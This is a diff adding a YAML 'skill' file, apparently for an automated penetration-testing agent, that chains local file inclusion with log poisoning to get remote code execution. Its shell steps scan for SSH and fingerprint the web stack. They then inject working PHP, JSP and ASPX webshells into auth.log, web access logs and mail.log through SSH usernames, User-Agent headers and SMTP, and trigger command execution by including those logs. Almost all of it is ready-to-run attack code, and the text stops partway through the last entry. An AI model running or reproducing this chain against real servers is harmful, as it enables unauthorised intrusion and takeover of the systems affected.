@@ -1,0 +1,671 @@
+skill_id: log_poisoning
+name: "日志投毒 RCE (Log Poisoning via LFI)"
+category: web_rce
+phase: foothold
+version: "1.0"
+
+principle: |
+  日志投毒是利用"可控写入点 + 文件包含"实现 RCE 的攻击链。
+  前置条件: 已确认 LFI（param/depth/style 已锁定）且至少一个日志文件可读。
+  四阶段流程（渐进验证）:
+    Phase 0 - 前置确认: LFI 参数已确认, 日志文件可通过 LFI 读取
+    Phase 1 - Canary 探针: 通过注入向量写入无害标记, 用 LFI 读日志验证回显
+    Phase 2 - 载荷投递: 用已验证的注入向量写入 webshell payload
+    Phase 3 - 触发 RCE: 通过 LFI 包含已投毒日志, 附带命令参数触发执行
+  注入向量（按可靠性排序）:
+    1. SSH auth.log — 用户名字段写入 /var/log/auth.log 或 /var/log/secure
+    2. HTTP User-Agent — UA 写入 Apache/Nginx access.log
+    3. SMTP mail.log — MAIL FROM 写入 /var/log/mail.log
+  Payload 由 webshell_lang 变量驱动, 自动选择 PHP/JSP/ASPX 格式。
+
+match:
+  rules:
+    - evidence_contains: ["log poisoning"]
+    - evidence_contains: ["file inclusion", "log"]
+    - evidence_contains: ["LFI", "auth.log"]
+    - evidence_contains: ["LFI", "access.log"]
+
+probes:
+  - id: check_ssh_port
+    description: "检查 SSH 端口, 捕获真实端口号"
+    skip_if:
+      variable_present: ssh_port
+    command: |
+      nmap -sT -p 22,2211,2222,2022,22222 --open {TARGET_IP} 2>/dev/null \
+        | awk '/^[0-9]+\/tcp\s+open\s+ssh/ {split($1,a,"/"); print "SSH_PORT_OPEN:" a[1]}' \
+        || echo "NO_SSH"
+    timeout: 15
+    parse_rules:
+      - if_regex: "SSH_PORT_OPEN:(\\d+)"
+        set: { ssh_available: true, ssh_port: "$1" }
+      - if_regex: "(\\d+)/tcp\\s+open\\s+ssh"
+        set: { ssh_available: true, ssh_port: "$1" }
+
+  - id: probe_webshell_lang
+    description: "识别目标 Web 技术栈（PHP/JSP/ASPX）, 驱动 payload 选择"
+    skip_if:
+      variable_present: webshell_lang
+    command: |
+      ENDPOINT="{ENDPOINT}"
+      BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      HEADERS=$(curl -sI --max-time 5 "$BASE/" 2>/dev/null)
+      COOKIES=$(echo "$HEADERS" | grep -i '^set-cookie:' | tr 'A-Z' 'a-z')
+      EXT_MATCH=$(echo "$ENDPOINT" | grep -oE '\.(php|jsp|jspx|asp|aspx|do|action)([?#]|$)' | head -1 | tr -d '?#')
+
+      LANG="php"
+      WHY="default"
+      if echo "$HEADERS" | grep -qiE 'x-powered-by:\s*php|^Server:.*php|php/'; then
+        LANG=php; WHY="hdr=php"
+      elif echo "$HEADERS" | grep -qiE 'x-powered-by:\s*asp\.net|^Server:.*iis|^x-aspnet-version'; then
+        LANG=aspx; WHY="hdr=iis/aspnet"
+      elif echo "$HEADERS" | grep -qiE '^Server:.*tomcat|^Server:.*jetty|^Server:.*weblogic|^Server:.*jboss|^Server:.*glassfish'; then
+        LANG=jsp; WHY="hdr=jvm-server"
+      elif echo "$COOKIES" | grep -q 'jsessionid='; then
+        LANG=jsp; WHY="cookie=JSESSIONID"
+      elif echo "$COOKIES" | grep -qE 'asp\.net_sessionid|\.aspxauth'; then
+        LANG=aspx; WHY="cookie=ASP.NET"
+      elif echo "$COOKIES" | grep -q 'phpsessid='; then
+        LANG=php; WHY="cookie=PHPSESSID"
+      elif [ "$EXT_MATCH" = ".php" ]; then
+        LANG=php; WHY="ext=.php"
+      elif [ "$EXT_MATCH" = ".jsp" ] || [ "$EXT_MATCH" = ".jspx" ] \
+          || [ "$EXT_MATCH" = ".do" ] || [ "$EXT_MATCH" = ".action" ]; then
+        LANG=jsp; WHY="ext=$EXT_MATCH"
+      elif [ "$EXT_MATCH" = ".asp" ] || [ "$EXT_MATCH" = ".aspx" ]; then
+        LANG=aspx; WHY="ext=$EXT_MATCH"
+      fi
+      echo "[INFO] webshell lang detection: lang=$LANG why=$WHY"
+      echo "WEBSHELL_LANG:$LANG"
+    timeout: 12
+    parse_rules:
+      - if_regex: "WEBSHELL_LANG:(\\w+)"
+        set: { webshell_lang: "$1" }
+
+  - id: canary_probe_ssh
+    description: "Phase 1 — SSH canary: 注入无害标记到 auth.log, 通过 LFI 验证回显"
+    depends_on: { ssh_available: true }
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== SSH Canary Probe (Phase 1) ==="
+
+      SSH_PORT="{ssh_port}"
+      if [ -z "$SSH_PORT" ] || [ "$SSH_PORT" = "{ssh_port}" ] \
+         || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
+        SSH_PORT=22
+      fi
+      SSH_BIN=$(command -v /usr/local/bin/legacy-ssh 2>/dev/null || echo ssh)
+
+      if ! (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT") 2>/dev/null; then
+        echo "[FAIL] SSH port $SSH_PORT unreachable"
+        echo "SSH_CANARY_FAIL"
+        exit 1
+      fi
+      exec 3>&- 3<&- 2>/dev/null || true
+
+      CANARY="PTCANARY$(date +%s)"
+      echo "[INFO] canary=$CANARY target={TARGET_IP}:$SSH_PORT"
+
+      SSH_ERR=$(sshpass -p "x" "$SSH_BIN" -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+        -p "$SSH_PORT" "${CANARY}"@{TARGET_IP} 2>&1 || true)
+      echo "$SSH_ERR" | head -2
+      if echo "$SSH_ERR" | grep -qi "invalid characters"; then
+        if command -v nc >/dev/null 2>&1; then
+          printf '%s\r\n' "$CANARY" | nc -w 2 {TARGET_IP} "$SSH_PORT" >/dev/null 2>&1 || true
+        else
+          (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT" && \
+           printf '%s\r\n' "$CANARY" >&3 && sleep 1 && \
+           exec 3>&- 3<&-) >/dev/null 2>&1 || true
+        fi
+      fi
+      sleep 2
+
+      CONFIRMED_PARAM="{lfi_param}"
+      CONFIRMED_DEPTH="{lfi_depth}"
+      LFI_STYLE="{lfi_style}"
+      LFI_PATH="{lfi_path}"
+      [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+      [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+      [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+      [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+      [ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
+      [ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"
+
+      build_lfi_url() {
+        local target_file="$1"
+        if [ "$LFI_STYLE" = "absolute" ]; then
+          if [ -n "$LFI_PATH" ]; then
+            echo "$BASE${LFI_PATH}/${target_file}"
+          else
+            echo "$BASE/?$CONFIRMED_PARAM=/${target_file}"
+          fi
+        else
+          local TRAV
+          TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+          if [ -n "$LFI_PATH" ]; then
+            echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+          else
+            echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}"
+          fi
+        fi
+      }
+
+      AUTH_LOGS="var/log/auth.log var/log/secure var/log/sshd.log var/log/messages var/log/syslog"
+      for logpath in $AUTH_LOGS; do
+        url=$(build_lfi_url "$logpath")
+        echo "[READ] $url"
+        result=$(curl -s "$url" --max-time 8 2>/dev/null)
+        if echo "$result" | grep -q "$CANARY"; then
+          echo "[HIT] Canary echoed in $logpath"
+          echo "SSH_CANARY_OK:$logpath"
+          exit 0
+        fi
+        sz=${#result}
+        echo "[MISS] $logpath (${sz}B, no canary)"
+      done
+      echo "SSH_CANARY_FAIL"
+    timeout: 45
+    parse_rules:
+      - if_regex: "SSH_CANARY_OK:(.+)"
+        set: { ssh_canary_confirmed: true, ssh_log_path: "$1" }
+
+  - id: canary_probe_ua
+    description: "Phase 1 — UA canary: 注入唯一 User-Agent 到 access.log, 通过 LFI 验证回显"
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== User-Agent Canary Probe (Phase 1) ==="
+
+      CANARY="UACANARY$(date +%s)"
+      echo "[INFO] canary=$CANARY"
+      curl -s "$BASE/" -H "User-Agent: $CANARY" --max-time 5 >/dev/null 2>&1 || true
+      sleep 2
+
+      CONFIRMED_PARAM="{lfi_param}"
+      CONFIRMED_DEPTH="{lfi_depth}"
+      LFI_STYLE="{lfi_style}"
+      LFI_PATH="{lfi_path}"
+      [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+      [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+      [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+      [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+      [ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
+      [ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"
+
+      build_lfi_url() {
+        local target_file="$1"
+        if [ "$LFI_STYLE" = "absolute" ]; then
+          if [ -n "$LFI_PATH" ]; then
+            echo "$BASE${LFI_PATH}/${target_file}"
+          else
+            echo "$BASE/?$CONFIRMED_PARAM=/${target_file}"
+          fi
+        else
+          local TRAV
+          TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+          if [ -n "$LFI_PATH" ]; then
+            echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+          else
+            echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}"
+          fi
+        fi
+      }
+
+      ACCESS_LOGS="var/log/apache2/access.log var/log/apache2/error.log \
+                   var/log/nginx/access.log var/log/nginx/error.log \
+                   var/log/httpd/access_log var/log/httpd/error_log \
+                   var/log/lighttpd/access.log"
+      for logpath in $ACCESS_LOGS; do
+        url=$(build_lfi_url "$logpath")
+        echo "[READ] $url"
+        result=$(curl -s "$url" --max-time 8 2>/dev/null)
+        if echo "$result" | grep -q "$CANARY"; then
+          echo "[HIT] Canary echoed in $logpath"
+          echo "UA_CANARY_OK:$logpath"
+          exit 0
+        fi
+        sz=${#result}
+        echo "[MISS] $logpath (${sz}B, no canary)"
+      done
+      echo "UA_CANARY_FAIL"
+    timeout: 45
+    parse_rules:
+      - if_regex: "UA_CANARY_OK:(.+)"
+        set: { ua_canary_confirmed: true, ua_log_path: "$1" }
+
+  - id: canary_probe_smtp
+    description: "Phase 1 — SMTP canary: MAIL FROM 注入到 mail.log, 通过 LFI 验证回显"
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== SMTP Canary Probe (Phase 1) ==="
+
+      if ! (exec 3<>/dev/tcp/{TARGET_IP}/25) 2>/dev/null; then
+        echo "[SKIP] SMTP port 25 unreachable"
+        echo "SMTP_CANARY_SKIP"
+        exit 0
+      fi
+      exec 3>&- 3<&- 2>/dev/null || true
+
+      CANARY="SMTPCANARY$(date +%s)"
+      echo "[INFO] canary=$CANARY target={TARGET_IP}:25"
+      (printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$CANARY" | \
+        nc -w 3 {TARGET_IP} 25 >/dev/null 2>&1) || true
+      sleep 2
+
+      CONFIRMED_PARAM="{lfi_param}"
+      CONFIRMED_DEPTH="{lfi_depth}"
+      LFI_STYLE="{lfi_style}"
+      LFI_PATH="{lfi_path}"
+      [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+      [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+      [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+      [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+      [ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
+      [ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"
+
+      build_lfi_url() {
+        local target_file="$1"
+        if [ "$LFI_STYLE" = "absolute" ]; then
+          if [ -n "$LFI_PATH" ]; then
+            echo "$BASE${LFI_PATH}/${target_file}"
+          else
+            echo "$BASE/?$CONFIRMED_PARAM=/${target_file}"
+          fi
+        else
+          local TRAV
+          TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+          if [ -n "$LFI_PATH" ]; then
+            echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+          else
+            echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}"
+          fi
+        fi
+      }
+
+      MAIL_LOGS="var/log/mail.log var/log/maillog"
+      for logpath in $MAIL_LOGS; do
+        url=$(build_lfi_url "$logpath")
+        echo "[READ] $url"
+        result=$(curl -s "$url" --max-time 8 2>/dev/null)
+        if echo "$result" | grep -q "$CANARY"; then
+          echo "[HIT] Canary echoed in $logpath"
+          echo "SMTP_CANARY_OK:$logpath"
+          exit 0
+        fi
+        sz=${#result}
+        echo "[MISS] $logpath (${sz}B, no canary)"
+      done
+      echo "SMTP_CANARY_FAIL"
+    timeout: 30
+    parse_rules:
+      - if_regex: "SMTP_CANARY_OK:(.+)"
+        set: { smtp_canary_confirmed: true, smtp_log_path: "$1" }
+
+exploit_paths:
+  # ═══════════════════════════════════════════════════════════════════
+  # Path 1: SSH auth.log 投毒 — canary 已确认回显, 走 deliver -> trigger
+  # ═══════════════════════════════════════════════════════════════════
+  - path_id: poison_via_ssh
+    name: "SSH auth.log 日志投毒 RCE（四阶段: canary 已确认）"
+    priority: 1
+    conditions:
+      ssh_canary_confirmed: true
+    steps:
+      - id: deliver_payload_ssh
+        description: "Phase 2 — 通过 SSH 用户名注入 webshell payload 到已确认的日志文件"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== SSH Log Poison: Payload Delivery (Phase 2) ==="
+
+          SSH_PORT="{ssh_port}"
+          if [ -z "$SSH_PORT" ] || [ "$SSH_PORT" = "{ssh_port}" ] \
+             || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
+            SSH_PORT=22
+          fi
+          SSH_BIN=$(command -v /usr/local/bin/legacy-ssh 2>/dev/null || echo ssh)
+
+          LANG="{webshell_lang}"
+          [ "$LANG" = "{webshell_lang}" ] && LANG="php"
+
+          case "$LANG" in
+            php)  PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
+            jsp)  PAYLOAD='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>' ;;
+            aspx) PAYLOAD='<%@ Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>' ;;
+            *)    PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
+          esac
+          echo "[INFO] lang=$LANG payload_len=${#PAYLOAD}"
+
+          SSH_ERR=$(sshpass -p "x" "$SSH_BIN" -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+            -p "$SSH_PORT" "${PAYLOAD}"@{TARGET_IP} 2>&1 || true)
+          echo "$SSH_ERR" | head -2
+          if echo "$SSH_ERR" | grep -qi "invalid characters"; then
+            echo "[INFO] SSH rejected special chars, falling back to nc banner injection"
+            if command -v nc >/dev/null 2>&1; then
+              printf '%s\r\n' "$PAYLOAD" | nc -w 2 {TARGET_IP} "$SSH_PORT" >/dev/null 2>&1 || true
+            else
+              (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT" && \
+               printf '%s\r\n' "$PAYLOAD" >&3 && sleep 1 && \
+               exec 3>&- 3<&-) >/dev/null 2>&1 || true
+            fi
+          fi
+
+          if (exec 3<>/dev/tcp/{TARGET_IP}/25) 2>/dev/null; then
+            exec 3>&- 3<&- 2>/dev/null || true
+            echo "[INFO] SMTP port open, also poisoning mail.log"
+            (printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$PAYLOAD" | \
+              nc -w 3 {TARGET_IP} 25 >/dev/null 2>&1) || true
+          fi
+          sleep 2
+          echo "PAYLOAD_DELIVERED"
+        timeout: 30
+        success_criteria:
+          stdout_contains_any: ["PAYLOAD_DELIVERED"]
+        on_success: trigger_rce_ssh
+        on_fail: next_path
+
+      - id: trigger_rce_ssh
+        description: "Phase 3 — 通过 LFI 包含已投毒的 SSH 日志文件, 触发 RCE"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== SSH Log Poison: RCE Trigger (Phase 3) ==="
+
+          CONFIRMED_PARAM="{lfi_param}"
+          CONFIRMED_DEPTH="{lfi_depth}"
+          LFI_STYLE="{lfi_style}"
+          LFI_PATH="{lfi_path}"
+          SSH_LOG="{ssh_log_path}"
+          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$SSH_LOG" = "{ssh_log_path}" ] && SSH_LOG=""
+          [ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
+          [ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"
+
+          LANG="{webshell_lang}"
+          [ "$LANG" = "{webshell_lang}" ] && LANG="php"
+          if [ "$LANG" = "aspx" ]; then
+            CMD_PARAM="cmd=whoami"
+            SUCCESS_RE='nt authority|iis apppool|administrator|system32'
+          else
+            CMD_PARAM="cmd=id&c=system('id');"
+            SUCCESS_RE='uid=[0-9]+'
+          fi
+
+          build_lfi_url() {
+            local target_file="$1"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}&${CMD_PARAM}"
+              else
+                echo "$BASE/?$CONFIRMED_PARAM=/${target_file}&${CMD_PARAM}"
+              fi
+            else
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}&${CMD_PARAM}"
+              else
+                echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}&${CMD_PARAM}"
+              fi
+            fi
+          }
+
+          if [ -n "$SSH_LOG" ]; then
+            TARGETS="$SSH_LOG"
+          else
+            TARGETS="var/log/auth.log var/log/secure var/log/sshd.log var/log/messages var/log/syslog"
+          fi
+
+          for logpath in $TARGETS; do
+            url=$(build_lfi_url "$logpath")
+            echo "[TRIGGER] $url"
+            result=$(curl -s "$url" --max-time 10 2>/dev/null)
+            if echo "$result" | grep -qiE "$SUCCESS_RE"; then
+              echo "[HIT] SSH_LOG_POISON_RCE via $logpath"
+              echo "$result" | grep -iE "$SUCCESS_RE" | head -3
+              exit 0
+            fi
+            echo "[MISS] $logpath (${#result}B)"
+          done
+          echo "SSH_LOG_POISON_TRIGGER_FAILED"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "(uid=[0-9]+|(?i)(nt authority|iis apppool|administrator))"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_ssh_log_poison"
+
+  # ═══════════════════════════════════════════════════════════════════
+  # Path 2: Apache/Nginx User-Agent 投毒 — canary 已确认回显
+  # ═══════════════════════════════════════════════════════════════════
+  - path_id: poison_via_ua
+    name: "HTTP User-Agent access.log 日志投毒 RCE（四阶段: canary 已确认）"
+    priority: 2
+    conditions:
+      ua_canary_confirmed: true
+    steps:
+      - id: deliver_payload_ua
+        description: "Phase 2 — 通过 User-Agent/Referer 注入 webshell payload 到 access.log"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== UA Log Poison: Payload Delivery (Phase 2) ==="
+
+          LANG="{webshell_lang}"
+          [ "$LANG" = "{webshell_lang}" ] && LANG="php"
+
+          case "$LANG" in
+            php)
+              curl -s "$BASE/" -H 'User-Agent: <?php system($_GET["cmd"]);?>' --max-time 5 >/dev/null 2>&1 || true
+              curl -s "$BASE/" -H 'User-Agent: <?=`id`?>' --max-time 5 >/dev/null 2>&1 || true
+              curl -s "$BASE/" -H 'Referer: <?php passthru($_GET["cmd"]);?>' --max-time 5 >/dev/null 2>&1 || true
+              ;;
+            jsp)
+              PAYLOAD='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>'
+              curl -s "$BASE/" -H "User-Agent: $PAYLOAD" --max-time 5 >/dev/null 2>&1 || true
+              ;;
+            aspx)
+              PAYLOAD='<%@ Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>'
+              curl -s "$BASE/" -H "User-Agent: $PAYLOAD" --max-time 5 >/dev/null 2>&1 || true
+              ;;
+          esac
+          sleep 1
+          echo "UA_PAYLOAD_DELIVERED"
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["UA_PAYLOAD_DELIVERED"]
+        on_success: trigger_rce_ua
+        on_fail: next_path
+
+      - id: trigger_rce_ua
+        description: "Phase 3 — 通过 LFI 包含已投毒的 access.log, 触发 RCE"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== UA Log Poison: RCE Trigger (Phase 3) ==="
+
+          CONFIRMED_PARAM="{lfi_param}"
+          CONFIRMED_DEPTH="{lfi_depth}"
+          LFI_STYLE="{lfi_style}"
+          LFI_PATH="{lfi_path}"
+          UA_LOG="{ua_log_path}"
+          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$UA_LOG" = "{ua_log_path}" ] && UA_LOG=""
+          [ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
+          [ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"
+
+          LANG="{webshell_lang}"
+          [ "$LANG" = "{webshell_lang}" ] && LANG="php"
+          if [ "$LANG" = "aspx" ]; then
+            CMD_PARAM="cmd=whoami"
+            SUCCESS_RE='nt authority|iis apppool|administrator|system32'
+          else
+            CMD_PARAM="cmd=id"
+            SUCCESS_RE='uid=[0-9]+'
+          fi
+
+          build_lfi_url() {
+            local target_file="$1"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}&${CMD_PARAM}"
+              else
+                echo "$BASE/?$CONFIRMED_PARAM=/${target_file}&${CMD_PARAM}"
+              fi
+            else
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}&${CMD_PARAM}"
+              else
+                echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}&${CMD_PARAM}"
+              fi
+            fi
+          }
+
+          if [ -n "$UA_LOG" ]; then
+            TARGETS="$UA_LOG"
+          else
+            TARGETS="var/log/apache2/access.log var/log/apache2/error.log \
+                     var/log/nginx/access.log var/log/nginx/error.log \
+                     var/log/httpd/access_log var/log/httpd/error_log"
+          fi
+
+          for logpath in $TARGETS; do
+            url=$(build_lfi_url "$logpath")
+            echo "[TRIGGER] $url"
+            result=$(curl -s "$url" --max-time 10 2>/dev/null)
+            if echo "$result" | grep -qiE "$SUCCESS_RE"; then
+              echo "[HIT] UA_LOG_POISON_RCE via $logpath"
+              echo "$result" | grep -iE "$SUCCESS_RE" | head -3
+              exit 0
+            fi
+            echo "[MISS] $logpath (${#result}B)"
+          done
+          echo "UA_LOG_POISON_TRIGGER_FAILED"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "(uid=[0-9]+|(?i)(nt authority|iis apppool|administrator))"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_access_log_poison"
+
+  # ═══════════════════════════════════════════════════════════════════
+  # Path 3: SMTP mail.log 投毒 — canary 已确认回显
+  # ═══════════════════════════════════════════════════════════════════
+  - path_id: poison_via_smtp
+    name: "SMTP mail.log 日志投毒 RCE（四阶段: canary 已确认）"
+    priority: 3
+    conditions:
+      smtp_canary_confirmed: true
+    steps:
+      - id: deliver_payload_smtp
+        description: "Phase 2 — 通过 SMTP MAIL FROM 注入 webshell payload 到 mail.log"
+        command: |
+          echo "=== SMTP Log Poison: Payload Delivery (Phase 2) ==="
+
+          LANG="{webshell_lang}"
+          [ "$LANG" = "{webshell_lang}" ] && LANG="php"
+
+          case "$LANG" in
+            php)  PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
+            jsp)  PAYLOAD='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>' ;;
+            aspx) PAYLOAD='<%@ Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>' ;;
+            *)    PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
+          esac
+
+          (printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$PAYLOAD" | \
+            nc -w 3 {TARGET_IP} 25 >/dev/null 2>&1) || true
+          sleep 2
+          echo "SMTP_PAYLOAD_DELIVERED"
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["SMTP_PAYLOAD_DELIVERED"]
+        on_success: trigger_rce_smtp
+        on_fail: next_path
+
+      - id: trigger_rce_smtp
+        description: "Phase 3 — 通过 LFI 包含已投毒的 mail.log, 触发 RCE"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== SMTP Log Poison: RCE Trigger (Phase 3) ==="
+
+          CONFIRMED_PARAM="{lfi_param}"
+          CONFIRMED_DEPTH="{lfi_depth}"
+          LFI_STYLE="{lfi_style}"
+          LFI_PATH="{lfi_path}"
+          SMTP_LOG="{smtp_log_path}"
+          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$SMTP_LOG" = "{smtp_log_path}" ] && SMTP_LOG=""
+          [ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
+          [ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"
+
+          CMD_PARAM="cmd=id"
+          SUCCESS_RE='uid=[0-9]+'
+
+          build_lfi_url() {
+            local target_file="$1"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}&${CMD_PARAM}"
+              else
+                echo "$BASE/?$CONFIRMED_PARAM=/${target_file}&${CMD_PARAM}"
+              fi
+            else
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}&${CMD_PARAM}"
+              else
+                echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}&${CMD_PARAM}"
+              fi
+            fi
+          }
+
+          if [ -n "$SMTP_LOG" ]; then
+            TARGETS="$SMTP_LOG"
+          else
+            TARGETS="var/log/mail.log var/log/maillog"
+          fi
+
+          for logpath in $TARGETS; do
+            url=$(build_lfi_url "$logpath")
+            echo "[TRIGGER] $url"
+            result=$(curl -s "$url" --max-time 10 2>/dev/null)
+            if echo "$result" | grep -qiE "$SUCCESS_RE"; then
+              echo "[HIT] SMTP_LOG_POISON_RCE via $logpath"
+              echo "$result" | grep -iE "$SUCCESS_RE" | head -3
+              exit 0
+            fi
+            echo "[MISS] $logpath (${#result}B)"
+          done
+          echo "SMTP_LOG_POISON_TRIGGER_FAILED"
+        timeout: 30
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
